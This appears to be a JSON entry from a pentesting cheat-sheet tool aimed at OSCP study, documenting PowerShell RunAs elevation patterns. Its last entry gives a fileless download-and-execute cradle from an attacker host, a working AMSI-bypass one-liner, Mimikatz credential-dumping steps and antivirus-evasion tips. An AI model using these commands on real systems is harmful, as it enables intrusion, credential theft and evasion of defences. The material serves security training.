{
  "category": "post-exploit",
  "subcategory": "windows",
  "description": "PowerShell manual elevation techniques using Start-Process -Verb RunAs (UAC prompt required)",
  "commands": [
    {
      "id": "powershell-runas-basic",
      "name": "PowerShell - Manual UAC Elevation (Basic)",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "powershell -Command \"Start-Process powershell -Verb RunAs\"",
      "description": "Launch new PowerShell window as administrator with UAC prompt (requires GUI interaction)",
      "variables": [],
      "flag_explanations": {
        "-Command": "Execute PowerShell command string (alternative: -c)",
        "Start-Process": "Starts one or more processes on local computer - similar to Unix exec but with elevation support",
        "powershell": "Target process to start - can be any executable (cmd.exe, notepad.exe, etc.)",
        "-Verb RunAs": "Requests administrative privileges via UAC prompt - equivalent to 'Run as Administrator' right-click",
        "-WindowStyle Hidden": "Optional: Hide the window during execution (Normal|Minimized|Maximized|Hidden)",
        "-Wait": "Optional: Wait for process to complete before returning control",
        "-NoNewWindow": "Optional: Run in same console window (doesn't work with -Verb RunAs)"
      },
      "tags": [
        "OSCP:LOW",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "WINDOWS",
        "POWERSHELL",
        "UAC",
        "MANUAL",
        "GUI_REQUIRED",
        "ONE_LINER"
      ],
      "oscp_relevance": "low",
      "success_indicators": [
        "UAC prompt appears asking for admin consent",
        "User clicks 'Yes' on UAC prompt",
        "New PowerShell window opens with elevated privileges",
        "Window title shows 'Administrator: Windows PowerShell'",
        "Check integrity: [Security.Principal.WindowsIdentity]::GetCurrent() shows High/System"
      ],
      "failure_indicators": [
        "UAC prompt blocked by policy - Check: Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin",
        "User clicks 'No' on UAC prompt - Process never spawns",
        "No GUI available (reverse shell, WinRM) - Cannot interact with UAC prompt",
        "User not in Administrators group - UAC prompt shows credential request instead of consent",
        "Error: This command cannot be run due to the error: The system cannot find the file specified"
      ],
      "troubleshooting": {
        "No UAC prompt appears": "Check UAC is enabled: (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLUA -eq 1. If 0, UAC disabled (process spawns elevated automatically).",
        "Credentials requested instead of consent": "User not in local Administrators group. Must provide admin username/password. Use -Credential parameter: Start-Process powershell -Verb RunAs -Credential (Get-Credential)",
        "Cannot interact with UAC from reverse shell": "Use UAC bypass techniques instead: fodhelper-uac-bypass, eventvwr-uac-bypass. RunAs requires physical/GUI access.",
        "Process spawns but not elevated": "User clicked 'No' or UAC denied. Check Event Viewer Application log for consent failures.",
        "Works on RDP but not WinRM": "WinRM is non-interactive session - no desktop to show UAC prompt. Use Invoke-Command with CredSSP delegation if needed."
      },
      "prerequisites": [
        "User must be member of local Administrators group",
        "UAC must be enabled (EnableLUA registry key = 1)",
        "GUI/Desktop session required (RDP, physical console, not WinRM/SSH)",
        "User must be present to click UAC prompt"
      ],
      "alternatives": [
        "fodhelper-uac-bypass",
        "eventvwr-uac-bypass",
        "runas-cmd-savedcreds"
      ],
      "next_steps": [
        "Verify elevation: whoami /groups | findstr /i 'Mandatory Label'",
        "Check if High integrity: Should show 'High Mandatory Level'",
        "If automated needed: Use UAC bypass techniques instead",
        "If credentials known: Use runas /user:Administrator cmd"
      ],
      "notes": "EDUCATIONAL CONTEXT:\nThis technique requires MANUAL INTERACTION - user must click 'Yes' on UAC prompt. NOT suitable for:\n- OSCP exam (no GUI interaction on reverse shells)\n- Automated exploitation scripts\n- Remote command execution via WinRM/SSH\n- Situations where stealth is required (UAC prompt is visible)\n\nWHY THIS EXISTS:\nLegitimate administrative workflow for interactive sessions (RDP, physical console). When admin user needs elevated privileges but launched PowerShell as standard user.\n\nUAC PROMPT BEHAVIOR:\n1. User in Admins group + UAC enabled = Consent prompt ('Yes/No')\n2. Standard user + UAC enabled = Credential prompt (username/password required)\n3. UAC disabled = Process spawns elevated without prompt\n\nWHEN TO USE:\n- RDP session as admin user, need elevated PowerShell\n- Physical console access, testing admin workflows\n- Social engineering scenarios (convince user to click 'Yes')\n- Legitimate sysadmin tasks in controlled environment\n\nWHEN NOT TO USE (OSCP):\n- Reverse shell from web exploit (no GUI)\n- WinRM remote command execution (non-interactive)\n- SSH shell access (no Windows desktop)\n- Any scenario requiring stealth (UAC prompt visible to user/defender)\n\nALTERNATIVES FOR OSCP:\n- UAC bypass (fodhelper, eventvwr) - No prompt, works in reverse shells\n- Exploit service misconfigurations - No user interaction\n- Token impersonation (JuicyPotato) - If SeImpersonate privilege available\n- Credential reuse with runas /savecred - If admin cached credentials\n\nHOW UAC WORKS:\n1. Process requests elevation via '-Verb RunAs'\n2. Windows displays consent.exe (UAC prompt on Secure Desktop)\n3. User clicks Yes → Process spawns with High integrity token\n4. User clicks No → Process never spawns, error returned\n5. Consent dialog times out (default 150 seconds) → Denied\n\nBEHIND THE SCENES:\n- Consent.exe runs on Secure Desktop (separate desktop session, prevents screen scraping)\n- Event ID 4688 logged (process creation with elevated token)\n- Parent process ID changes (new elevated process not child of current shell)\n- Token type changes: Filtered Admin Token → Full Admin Token\n\nINTEGRITY LEVELS:\nBefore RunAs: Medium Mandatory Level (filtered admin token)\nAfter RunAs (Yes clicked): High Mandatory Level (full admin token)\n\nTIME ESTIMATE:\n10-15 seconds (including user clicking prompt)\n\nEXAM TIP:\nDO NOT attempt this on OSCP exam. You cannot interact with UAC prompts on target machines. Use:\n1. UAC bypass if user in Admins group\n2. Service exploitation if no admin access\n3. Kernel exploits as last resort\n\nMANUAL ALTERNATIVE:\nRight-click PowerShell icon → 'Run as Administrator' (same UAC prompt)\n\nVERIFICATION:\nBefore: whoami /groups | findstr 'Mandatory'\n  → Mandatory Label\\Medium Mandatory Level\nAfter: whoami /groups | findstr 'Mandatory'\n  → Mandatory Label\\High Mandatory Level"
    },
    {
      "id": "powershell-runas-output-redirect",
      "name": "PowerShell - UAC Elevation with Output Redirect",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-Command','Get-Process > C:\\temp\\output.txt'\"",
      "description": "Execute elevated PowerShell command with output redirected to file (requires UAC prompt approval)",
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "PowerShell command to execute with elevation (output redirected to file)",
          "example": "Get-Process",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Path where command output will be written",
          "example": "C:\\temp\\output.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ArgumentList": "Array of arguments passed to new PowerShell process. Use comma-separated strings for multiple arguments.",
        "'-Command'": "First argument: tells new PowerShell to execute a command (alternative: -File for scripts)",
        "'<COMMAND> > <FILE>'": "Second argument: actual command with output redirection. Single quotes prevent expansion in current shell.",
        "-Wait": "Optional: Wait for elevated process to complete before continuing (useful when reading output file immediately after)",
        "-PassThru": "Optional: Return Process object for the spawned process (allows monitoring PID, exit code)"
      },
      "tags": [
        "OSCP:LOW",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "WINDOWS",
        "POWERSHELL",
        "UAC",
        "MANUAL",
        "GUI_REQUIRED",
        "FILE_OUTPUT",
        "ONE_LINER"
      ],
      "oscp_relevance": "low",
      "success_indicators": [
        "UAC prompt appears and user clicks 'Yes'",
        "Elevated PowerShell window flashes briefly (may be too fast to see)",
        "Output file created at specified path",
        "Output file contains expected command results",
        "File timestamps match execution time"
      ],
      "failure_indicators": [
        "No output file created - User clicked 'No' on UAC or command failed",
        "Output file empty - Command executed but produced no output",
        "Access denied writing file - Path requires additional permissions (even with elevation)",
        "File not found errors - Typo in file path or drive doesn't exist",
        "Cannot interact from reverse shell - No GUI for UAC prompt"
      ],
      "troubleshooting": {
        "Output file not created": "1) Verify user clicked 'Yes' on UAC prompt. 2) Check parent directory exists (mkdir C:\\temp first). 3) Test file path is writable: Test-Path -Path C:\\temp -PathType Container",
        "Empty output file created": "Command executed but no output generated. Check command syntax is correct. Try simpler command: 'whoami > C:\\temp\\test.txt'",
        "Access denied on output file": "Even elevated processes can't write to some locations (Windows\\System32 for non-SYSTEM). Use C:\\temp, C:\\Users\\Public, or user's home directory.",
        "Process spawns but output not captured": "Timing issue - process completes before file written. Add -Wait flag to Start-Process: -Wait -ArgumentList ...",
        "Cannot read output in current shell": "New process runs in separate window. Output goes to file, not current console. Read file after: Get-Content C:\\temp\\output.txt"
      },
      "prerequisites": [
        "User in local Administrators group",
        "UAC enabled on target system",
        "GUI session available (RDP, console)",
        "Output directory exists and is writable",
        "User present to click UAC prompt"
      ],
      "alternatives": [
        "fodhelper-uac-bypass",
        "eventvwr-uac-bypass",
        "powershell-runas-keepopen"
      ],
      "next_steps": [
        "Read output file: type C:\\temp\\output.txt",
        "Or in PowerShell: Get-Content C:\\temp\\output.txt",
        "Verify output contains expected data",
        "Clean up: del C:\\temp\\output.txt",
        "For automation: Use UAC bypass techniques instead"
      ],
      "notes": "EDUCATIONAL CONTEXT:\nThis pattern attempts to work around the limitation that you can't directly capture output from elevated processes in a non-elevated shell.\n\nWHY OUTPUT REDIRECT NEEDED:\nElevated process spawns in new window with new console. Output from elevated commands not visible in your current shell. File redirection bridges this gap.\n\nWORKFLOW:\n1. Current shell (Medium integrity) runs Start-Process\n2. UAC prompt appears, user clicks 'Yes'\n3. New PowerShell window spawns (High integrity)\n4. Command executes in elevated context\n5. Output written to file (accessible from both integrity levels)\n6. Elevated window closes automatically\n7. Original shell reads output file\n\nCOMMON USE CASE:\nYou have RDP access as admin user but PowerShell opened without elevation. Need to run Get-Service but capture output without opening new window and copy-pasting.\n\nOSCP REALITY CHECK:\nThis technique is USELESS for exam because:\n- No GUI on reverse shells\n- Can't click UAC prompts remotely\n- Automated exploitation required\n- File I/O slower than direct output\n\nBETTER ALTERNATIVES FOR OSCP:\n1. UAC Bypass (no prompt):\n   fodhelper-uac-bypass with reverse shell payload\n2. Service Exploitation:\n   If you can modify service, run commands as SYSTEM\n3. Scheduled Tasks:\n   Create task running as SYSTEM, wait for execution\n4. Token Impersonation:\n   JuicyPotato/PrintSpoofer if SeImpersonate available\n\nFILE LOCATION CONSIDERATIONS:\nWritable even from Medium integrity:\n- C:\\temp (if exists)\n- C:\\Users\\<username>\\AppData\\Local\\Temp\n- C:\\Users\\Public\n\nRequire elevation even for admin users:\n- C:\\Windows\\System32 (SYSTEM only)\n- C:\\Program Files (most locations)\n- Registry hives (HKLM requires elevation)\n\nWHY THIS PATTERN EXISTS:\nLegitimate sysadmin workflow: Need one-off elevated command output without keeping elevated window open. Quick privilege check without persistent elevated shell.\n\nREADING OUTPUT:\nImmediate read (may fail if process still running):\n  type C:\\temp\\output.txt\n\nWait for completion:\n  Start-Process ... -Wait -ArgumentList ...\n  type C:\\temp\\output.txt\n\nPowerShell monitoring:\n  while (!(Test-Path C:\\temp\\output.txt)) { Start-Sleep 1 }\n  Get-Content C:\\temp\\output.txt\n\nPROCESS MONITORING:\nWith -PassThru flag:\n  $proc = Start-Process ... -PassThru\n  Wait-Process -Id $proc.Id\n  Get-Content C:\\temp\\output.txt\n\nSECURITY IMPLICATIONS:\n- Output file readable by Medium integrity processes\n- Sensitive data (password hashes) exposed in cleartext file\n- File persists after execution (forensic artifact)\n- Always clean up: Remove-Item C:\\temp\\output.txt -Force\n\nCOMMAND ESCAPING:\nNested quotes require careful escaping:\n  Wrong: -ArgumentList '-Command','Get-Process | Where {$_.CPU -gt 10}'\n  Right: -ArgumentList '-Command',\"Get-Process | Where {`$_.CPU -gt 10}\"\n\nBacktick (`) escapes special characters in double quotes.\n\nTIME ESTIMATE:\n15-20 seconds (UAC prompt + file I/O + reading output)\n\nEXAM TIP:\nIf you find yourself trying to use this on OSCP exam, STOP. You're approaching the problem wrong. Reverse shells can't interact with UAC. Use exploitation or bypass techniques instead.\n\nMANUAL ALTERNATIVE:\n1. Right-click PowerShell → Run as Administrator\n2. Run command manually\n3. Copy output from console\n(Same UAC prompt, more steps)"
    },
    {
      "id": "powershell-runas-keepopen",
      "name": "PowerShell - UAC Elevation (Keep Window Open)",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','cd C:\\\\'\"",
      "description": "Launch elevated PowerShell window that stays open for interactive use (requires UAC prompt)",
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Initial command to run in elevated session (optional, can be just 'cd C:\\\\')",
          "example": "cd C:\\temp",
          "required": false
        }
      ],
      "flag_explanations": {
        "-NoExit": "Keep PowerShell window open after command executes (default behavior closes window immediately)",
        "'-Command','cd C:\\\\'": "Initial command to run - use cd to set working directory, or any setup command. Double backslash needed for escaping.",
        "-ExecutionPolicy Bypass": "Optional: Add as argument to bypass script execution restrictions in elevated session",
        "-NoProfile": "Optional: Don't load PowerShell profile (faster startup, cleaner environment)"
      },
      "tags": [
        "OSCP:LOW",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "WINDOWS",
        "POWERSHELL",
        "UAC",
        "MANUAL",
        "GUI_REQUIRED",
        "INTERACTIVE",
        "ONE_LINER"
      ],
      "oscp_relevance": "low",
      "success_indicators": [
        "UAC prompt appears and user clicks 'Yes'",
        "New PowerShell window opens and stays open",
        "Window title shows 'Administrator: Windows PowerShell'",
        "Prompt shows elevated path (default: PS C:\\Windows\\system32>)",
        "Window persists after initial command completes"
      ],
      "failure_indicators": [
        "Window flashes and closes immediately - Remove -Command flag or add -NoExit",
        "Window opens but not elevated - User clicked 'No' on UAC or not in Admins group",
        "No window appears - UAC denied or user credentials invalid",
        "Error: This command cannot be run - Syntax error in ArgumentList",
        "Cannot interact with UAC from remote shell - No GUI available"
      ],
      "troubleshooting": {
        "Window closes immediately after opening": "Missing -NoExit flag. Must be FIRST argument in ArgumentList: -ArgumentList '-NoExit','-Command','...'",
        "Working directory is System32": "Expected behavior for elevated processes. Change directory: -ArgumentList '-NoExit','-Command','cd C:\\\\temp'",
        "Execution policy blocks scripts": "Add bypass to arguments: -ArgumentList '-NoExit','-ExecutionPolicy','Bypass','-Command','...'",
        "Cannot see window (might be behind other windows)": "Add -WindowStyle parameter: Start-Process ... -WindowStyle Normal (or use -WindowStyle Maximized)",
        "Need to run script instead of command": "Use -File instead of -Command: -ArgumentList '-NoExit','-File','C:\\\\scripts\\\\setup.ps1'"
      },
      "prerequisites": [
        "User in local Administrators group",
        "UAC enabled",
        "GUI/Desktop session (RDP, physical console)",
        "User available to interact with elevated window"
      ],
      "alternatives": [
        "fodhelper-uac-bypass",
        "eventvwr-uac-bypass",
        "runas-cmd-interactive"
      ],
      "next_steps": [
        "In elevated window: whoami /groups | findstr 'Mandatory'",
        "Verify High Mandatory Level shown",
        "Use elevated window for admin tasks (service management, registry edits)",
        "When done: exit (closes window)",
        "For automation: Use UAC bypass instead of manual elevation"
      ],
      "notes": "EDUCATIONAL CONTEXT:\nMost common legitimate use of Start-Process -Verb RunAs. Opens persistent elevated PowerShell for interactive administrative work.\n\nWHY -NoExit NEEDED:\nDefault PowerShell behavior: Execute command, then close window immediately. -NoExit keeps window open for continued interactive use.\n\nARGUMENT ORDER MATTERS:\n  Correct:   -ArgumentList '-NoExit','-Command','cd C:\\\\'\n  Incorrect: -ArgumentList '-Command','cd C:\\\\','-NoExit'  # -NoExit ignored if not first\n\nCOMPARISON OF PATTERNS:\n1. Basic elevation (powershell-runas-basic):\n   - No arguments\n   - Opens elevated shell in default directory (System32)\n   - Stays open by default (no -Command to execute)\n\n2. Output redirect (powershell-runas-output-redirect):\n   - Executes one command\n   - Window closes immediately\n   - Output captured to file\n\n3. Keep open (THIS COMMAND):\n   - Executes initial setup command\n   - Stays open for interactive use\n   - Can run multiple commands after opening\n\nUSE CASES:\n- Run multiple elevated commands without reopening window each time\n- Interactive troubleshooting requiring admin rights\n- Testing scripts that require elevation\n- Setting up environment (import modules, set variables) then work interactively\n\nWHY NOT OSCP:\nSame limitations as other manual elevation techniques:\n- Requires GUI interaction (UAC prompt)\n- User must be present to click 'Yes'\n- Not automatable\n- Reverse shells have no GUI\n- Stealth not possible (visible window and UAC prompt)\n\nWHEN YOU MIGHT USE THIS (NON-OSCP):\n- RDP to Windows server, need admin PowerShell for configuration tasks\n- Physical access to workstation, troubleshooting as admin\n- Pentesting internal network with RDP access and known admin credentials\n- Social engineering: convince user to run and approve UAC\n\nINITIAL COMMAND IDEAS:\nSet working directory:\n  -ArgumentList '-NoExit','-Command','cd C:\\\\temp'\n\nLoad script/module:\n  -ArgumentList '-NoExit','-Command','Import-Module ActiveDirectory'\n\nSet execution policy for session:\n  -ArgumentList '-NoExit','-ExecutionPolicy','Bypass'\n\nCombine multiple setup commands:\n  -ArgumentList '-NoExit','-Command','cd C:\\\\temp; Import-Module .\\\\MyModule.psm1'\n\nWORKING DIRECTORY BEHAVIOR:\nElevated process starts in: C:\\Windows\\system32\nReason: Default working directory for processes launched with RunAs\nChange with: -ArgumentList '-NoExit','-Command','cd <path>'\n\nOR set before launching:\n  Start-Process ... -WorkingDirectory 'C:\\temp'\n  (Note: -WorkingDirectory works WITH -Verb RunAs)\n\nWINDOW STYLING:\nDefault: Normal window\n  -WindowStyle Normal (default)\n  -WindowStyle Maximized (full screen)\n  -WindowStyle Minimized (starts in taskbar)\n  -WindowStyle Hidden (invisible - not useful for interactive shell)\n\nCLOSING THE WINDOW:\nManual: Type 'exit' or click X\nProgrammatic: Get-Process -Name powershell | Where {$_.MainWindowTitle -like '*Administrator*'} | Stop-Process\n\nCOMPARISON TO cmd.exe:\nPowerShell:\n  Start-Process powershell -Verb RunAs -ArgumentList '-NoExit'\nCommand Prompt:\n  Start-Process cmd -Verb RunAs -ArgumentList '/k','cd C:\\\\'\n  (/k keeps cmd open, /c closes after command)\n\nPROFILE LOADING:\nBy default, elevated PowerShell loads profile from:\n  $PFILES\\WindowsPowerShell\\profile.ps1\n  $HOME\\Documents\\WindowsPowerShell\\profile.ps1\n\nSkip for faster startup:\n  -ArgumentList '-NoExit','-NoProfile','-Command','...'\n\nEXECUTION POLICY:\nInherited from system policy, usually:\n  - RemoteSigned (default on servers)\n  - Restricted (default on workstations)\n\nBypass for session:\n  -ArgumentList '-NoExit','-ExecutionPolicy','Bypass'\n\nTIME ESTIMATE:\n10 seconds (UAC prompt + window spawn)\n\nEXAM TIP:\nThis is a LEGITIMATE SYSADMIN TECHNIQUE, not a penetration testing technique. On OSCP, if you need elevated PowerShell:\n1. First try UAC bypass (fodhelper/eventvwr)\n2. If that fails, look for service misconfigurations\n3. Check for privilege escalation vectors (Potato exploits)\n4. Only use RunAs if you have RDP AND admin credentials AND need interactive session\n\nMANUAL ALTERNATIVE:\n1. Click Start menu\n2. Type 'PowerShell'\n3. Right-click 'Windows PowerShell'\n4. Click 'Run as Administrator'\n5. Click 'Yes' on UAC prompt\n(Same result, GUI-only method)"
    },
    {
      "id": "powershell-runas-download-execute",
      "name": "PowerShell - UAC Elevation with Remote Script Download",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\\\"http://<LHOST>/PowerUp.ps1\\\")\\\"'\"",
      "description": "Download and execute PowerShell script with elevation (requires UAC prompt) - combines RunAs with IEX download cradle",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP hosting PowerShell script (HTTP server on port 80/8000)",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SCRIPT>",
          "description": "PowerShell script to download and execute (PowerUp.ps1, PowerView.ps1, Invoke-Mimikatz.ps1)",
          "example": "PowerUp.ps1",
          "required": true
        }
      ],
      "flag_explanations": {
        "IEX": "Invoke-Expression - executes downloaded script content as PowerShell code",
        "New-Object Net.WebClient": "Creates WebClient object for HTTP downloads (alternative: Invoke-WebRequest)",
        ".DownloadString()": "Downloads file content as string (in-memory, no disk write)",
        "Escaped quotes \\\"": "Double-backslash quote needed when nested in ArgumentList string - prevents premature quote termination",
        "-NoExit": "Keeps window open after script executes (useful for interactive post-exploitation tools)"
      },
      "tags": [
        "OSCP:LOW",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "WINDOWS",
        "POWERSHELL",
        "UAC",
        "MANUAL",
        "GUI_REQUIRED",
        "REMOTE_DOWNLOAD",
        "FILELESS",
        "ONE_LINER"
      ],
      "oscp_relevance": "low",
      "success_indicators": [
        "UAC prompt appears (user must click 'Yes')",
        "New elevated PowerShell window spawns",
        "HTTP request logged on attacker web server (GET /PowerUp.ps1)",
        "Script downloads and executes in elevated context",
        "Script output appears in elevated window (e.g., PowerUp findings)"
      ],
      "failure_indicators": [
        "No UAC prompt - User not in Admins group or UAC disabled",
        "UAC denied - User clicked 'No'",
        "Cannot resolve hostname - Network connectivity issue or bad <LHOST>",
        "HTTP 404 - Script not found on web server",
        "Invoke-WebRequest error - Proxy blocking, firewall, or AV intervention",
        "Script downloads but doesn't execute - Syntax error in script or IEX call",
        "Cannot interact with UAC from reverse shell - No GUI available"
      ],
      "troubleshooting": {
        "Download fails - cannot resolve host": "1) Verify web server running: python3 -m http.server 80. 2) Check attacker IP is correct. 3) Test connectivity: ping <LHOST>. 4) Check Windows firewall: Test-NetConnection <LHOST> -Port 80",
        "Download fails - 404 Not Found": "Script not in web server directory. Verify: ls <web_root> shows PowerUp.ps1. Ensure filename case matches (case-sensitive on Linux servers).",
        "Script downloads but syntax error": "Quote escaping issue. Verify escaped quotes: \\\" around URL. Test command locally before using in RunAs.",
        "AV blocks download or execution": "1) Windows Defender SmartScreen may block unknown scripts. 2) Check quarantine: Get-MpThreatDetection. 3) Use obfuscation or encode script. 4) Alternative: -EncodedCommand parameter with base64.",
        "Cannot see output": "Add -NoExit to keep window open. Without it, window closes immediately after script completes. Current command already includes -NoExit."
      },
      "prerequisites": [
        "User in local Administrators group",
        "UAC enabled on target",
        "GUI session (RDP, physical console)",
        "Network connectivity to <LHOST>",
        "HTTP server running on <LHOST>",
        "PowerShell script hosted at http://<LHOST>/<SCRIPT>",
        "User present to click UAC 'Yes'"
      ],
      "alternatives": [
        "fodhelper-uac-bypass",
        "eventvwr-uac-bypass",
        "powershell-download-execute-non-elevated",
        "win-privesc-powerup"
      ],
      "next_steps": [
        "Wait for UAC prompt and user to click 'Yes'",
        "Check attacker web server logs for GET request",
        "Review output in elevated PowerShell window",
        "For PowerUp: Analyze findings for privesc vectors",
        "For Mimikatz: Capture dumped credentials",
        "Clean up: Stop web server, close elevated window"
      ],
      "notes": "EDUCATIONAL CONTEXT:\nThis technique combines THREE operations:\n1. Manual UAC elevation (Start-Process -Verb RunAs)\n2. Remote script download (WebClient.DownloadString)\n3. In-memory execution (IEX)\n\nWHY THIS PATTERN EXISTS:\nScenario: You have RDP access as admin user. Need to run PowerUp/PowerView/Mimikatz with elevation, but script is on attacker machine. This downloads and runs in single step with elevated privileges.\n\nREALITY CHECK - NOT FOR OSCP:\nThis technique is SEVERELY LIMITED for exam:\n- Requires GUI to click UAC prompt (reverse shells can't do this)\n- User must be physically present or RDP active\n- UAC prompt is highly visible (not stealthy)\n- Requires network connectivity back to attacker (may be blocked)\n- Automated exploitation impossible\n\nWHEN YOU MIGHT USE THIS (RARE):\nPentesting scenario: Internal network, RDP access with known admin credentials, need to run enumeration tools (PowerView for AD recon, PowerUp for local privesc checks) without transferring files to disk.\n\nBETTER ALTERNATIVES FOR OSCP:\n1. UAC Bypass + Download:\n   fodhelper-uac-bypass → bypass UAC without prompt\n   Then run: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')\n   Result: Elevated execution WITHOUT user interaction\n\n2. Non-Elevated Download First:\n   Download script without elevation: IEX(New-Object...) in current shell\n   Many tools work without elevation (PowerView, SharpHound)\n   Escalate later if needed\n\n3. File Transfer + Local Execution:\n   certutil -urlcache -f http://<LHOST>/PowerUp.ps1 C:\\temp\\PowerUp.ps1\n   Then: fodhelper-uac-bypass with local script execution\n   Pros: Script persists if download interrupted, can reuse\n\nQUOTE ESCAPING BREAKDOWN:\nCOMMAND LAYER 1 (outer shell):\n  powershell -Command \"...\"\n\nCOMMAND LAYER 2 (Start-Process argument):\n  Start-Process ... -ArgumentList '...','...'\n\nCOMMAND LAYER 3 (elevated PowerShell command):\n  IEX(New-Object Net.WebClient).DownloadString(\"URL\")\n\nESCAPING RULES:\n  Layer 3 quotes must be escaped for Layer 2: \\\" (backslash-quote)\n  Result: ...DownloadString(\\\"http://...\\\")...\n\nFILELESS EXECUTION:\nAdvantages:\n- No file written to disk (less forensic artifact)\n- AV may not scan in-memory downloads (depends on AMSI)\n- Script doesn't persist after PowerShell closes\n\nDisadvantages:\n- Must re-download if connection lost or window closes\n- AMSI (Anti-Malware Scan Interface) scans script content anyway\n- Network traffic visible (HTTP GET logged)\n\nWEB SERVER SETUP:\nOn attacker machine (Kali):\n  cd /path/to/scripts\n  python3 -m http.server 80\n  # Or: sudo python3 -m http.server 80 (if binding to port 80)\n\nVerify script accessible:\n  curl http://localhost/PowerUp.ps1\n  (Should return script content)\n\nFrom target:\n  Test-NetConnection <LHOST> -Port 80\n  Invoke-WebRequest http://<LHOST>/PowerUp.ps1\n\nCOMMON SCRIPTS TO USE:\n1. PowerUp.ps1 - Windows privesc enumeration\n   https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1\n   After download: Invoke-AllChecks\n\n2. PowerView.ps1 - Active Directory enumeration\n   https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\n   After download: Get-NetUser, Get-NetGroup\n\n3. Invoke-Mimikatz.ps1 - Credential dumping (requires elevation)\n   After download: Invoke-Mimikatz -DumpCreds\n\nAMSI BYPASS:\nWindows 10+ has AMSI (Anti-Malware Scan Interface) that scans script content even when downloaded in-memory. Known malicious scripts (Mimikatz) may be blocked.\n\nBypass AMSI before download:\n  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\nCombine with download:\n  -ArgumentList '-NoExit','-Command','[Ref].Assembly...SetValue($null,$true); IEX(New-Object...)'\n\nWINDOW BEHAVIOR:\n-NoExit included: Window stays open after script executes\n- For PowerUp: Review findings interactively\n- For Mimikatz: Credentials displayed in window, can copy manually\n\nWithout -NoExit: Window closes immediately after script completes\n- Output lost unless redirected to file\n- Not useful for interactive tools\n\nNETWORK VISIBILITY:\nHTTP traffic is UNENCRYPTED:\n- Script content visible to network monitoring (IDS/IPS)\n- Defender/EDR may inspect HTTP traffic\n- Consider HTTPS if target allows (requires certificate on attacker server)\n\nHTTPS alternative:\n  python3 -m http.server --bind <LHOST> 443 --certfile cert.pem --keyfile key.pem\n  (Requires self-signed cert, target may reject untrusted cert)\n\nALTERNATIVE DOWNLOAD METHODS:\n1. Invoke-WebRequest (PowerShell 3.0+):\n   IEX(Invoke-WebRequest -Uri http://<LHOST>/script.ps1 -UseBasicParsing).Content\n\n2. BitsTransfer (stealthier, uses Windows BITS):\n   Import-Module BitsTransfer\n   Start-BitsTransfer -Source http://<LHOST>/script.ps1 -Destination C:\\temp\\script.ps1\n\n3. certutil (file-based, not in-memory):\n   certutil -urlcache -f http://<LHOST>/script.ps1 C:\\temp\\script.ps1\n\nTIMING:\n15-30 seconds:\n- UAC prompt + user interaction: 5-10 sec\n- Script download (depends on size): 1-5 sec\n- Script execution (depends on script): 5-15 sec\n\nFOR POWERUP:\n- Download: ~2 sec (100KB file)\n- Invoke-AllChecks execution: 10-30 sec (depending on system)\n\nEXAM TIP - DO NOT USE:\nIf you're considering this on OSCP exam, you're making it too complicated. You likely have one of these situations:\n\n1. You have RDP with admin creds:\n   - Just run PowerShell as admin normally (right-click → Run as Admin)\n   - Or use UAC bypass (no prompt needed)\n\n2. You have reverse shell:\n   - No GUI = can't click UAC prompt\n   - Use UAC bypass techniques instead\n   - Or download script without elevation first\n\n3. You need PowerUp/PowerView output:\n   - Many checks work without elevation\n   - Run without UAC first, escalate later if needed\n\nMANUAL ALTERNATIVE:\n1. Open PowerShell as administrator (right-click → Run as Admin)\n2. Click 'Yes' on UAC prompt\n3. Run: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')\n4. Review output\n\n(Same result, simpler execution, fewer quote-escaping errors)"
    }
  ]
}
